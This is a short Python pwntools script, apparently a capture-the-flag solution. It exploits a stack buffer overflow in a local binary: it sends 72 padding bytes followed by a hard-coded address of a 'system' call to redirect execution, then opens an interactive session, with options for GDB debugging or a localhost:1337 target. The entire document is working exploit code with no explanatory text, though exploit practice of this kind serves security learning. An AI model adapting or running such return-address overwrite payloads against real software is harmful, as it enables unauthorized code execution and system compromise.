from pwn import *

binary = args.BIN

e = context.binary = ELF(binary)

gs = '''
b *0x00000000004011ab
c
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("localhost", 1337)
    else:
        return process(e.path, stdin=PTY)


p = start()

system = 0x4012ca
ret = 0x000000000040101a

p.sendline(b'nonsense')
p.sendline(b'nonsense')
p.sendline(flat(
  b'a'*72, system
))

p.interactive()